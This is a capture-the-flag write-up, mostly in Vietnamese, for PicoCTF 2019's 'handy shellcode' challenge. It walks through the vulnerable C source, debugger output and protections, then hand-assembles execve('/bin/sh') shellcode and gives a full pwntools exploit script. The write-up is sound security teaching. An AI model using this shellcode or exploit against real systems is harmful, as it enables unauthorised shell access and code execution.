# handy shellcode PicoCTF2019

```python
file vuln                                                                                                   
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
```

Source code: 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();

  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Ta nhận thấy là với hàm ***vuln*** với việc gọi đến **gets** cho phép ta thực hiện overflow

Hơn nữa ta phải xác định xem:
```c
((void (*)())buf)();
```
rốt cuộc là gì?

Debug:

```python
0x08048959 <+128>:	push   eax
   0x0804895a <+129>:	call   0x80502f0 <puts>
   0x0804895f <+134>:	add    esp,0x10
   0x08048962 <+137>:	lea    eax,[ebp-0xa0]
   0x08048968 <+143>:	call   eax
   0x0804896a <+145>:	sub    esp,0xc
   0x0804896d <+148>:	lea    eax,[ebx-0x2dbc8]
   0x08048973 <+154>:	push   eax
   0x08048974 <+155>:	call   0x80502f0 <puts>
   0x08048979 <+160>:	add    esp,0x10
   0x0804897c <+163>:	mov    eax,0x0
   0x08048981 <+168>:	lea    esp,[ebp-0x8]
   0x08048984 <+171>:	pop    ecx
   0x08048985 <+172>:	pop    ebx
   0x08048986 <+173>:	pop    ebp
   0x08048987 <+174>:	lea    esp,[ecx-0x4]
   0x0804898a <+177>:	ret    
```
Ta nhận thấy giữa 2 lần gọi **puts** thì xuất hiện việc ***call eax*** chắc hẳn đây chính là đáp án cho câu hỏi trên.

Tiến hành đặt breakpoint tại ***call eax*** 
```python
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
*EAX  0xffffcf68 ◂— 0x636261 /* 'abc' */
 EBX  0x80da000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
*ECX  0x80da227 (_IO_2_1_stdout_+71) ◂— 0xdb8700a
*EDX  0x80db870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0x80481a8 (_init) ◂— push ebx
 ESI  0x80da000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 EBP  0xffffd008 ◂— 0x0
*ESP  0xffffcf60 ◂— 0xf0
*EIP  0x8048968 (main+143) ◂— call eax
────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────
 ► 0x8048968 <main+143>    call   eax                           <0xffffcf68>
 
```
Thì ta nhận thấy nó call thẳng tới thanh ghi eax mà trong khi đó eax lúc này chứa chuỗi mà ta nhập vào.

```zsh
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
Với NX bị disable do đó ta có thể đưa shell code vào, để nó gọi ngay tới shell code của mình.

Ta tra bảng [systemcall x86 32-bit](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) và dùng [tool](https://defuse.ca/online-x86-assembler.htm#disassembly) để viết shell code, convert từ ASM => hex

Ta sẽ dùng systemcall : ***execve("/bin/sh")***

Cụ thể như sau:

* EAX = 0x0b
* EBX = địa chỉ chuỗi "/bin/sh"
* ECX = EDX = 0

```python
>>> import binascii
>>> binascii.hexlify(b"/bin/sh\0"[::-1])
b'0068732f6e69622f'
```
Với kiến trúc 32-bit:

```python
xor eax,eax
add eax,0x0b
xor ecx,ecx
xor edx,edx
push edx
push 0x0068732f
push 0x6e69622f
mov ebx,esp
int 0x80
```

Exploit:
```python
from pwn import *

r = process("./vuln")
#gdb.attach(r, api=True)
#print(r.recvuntil(b"shellcode:"))
payload = "\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"

r.sendline(payload)
r.interactive()
```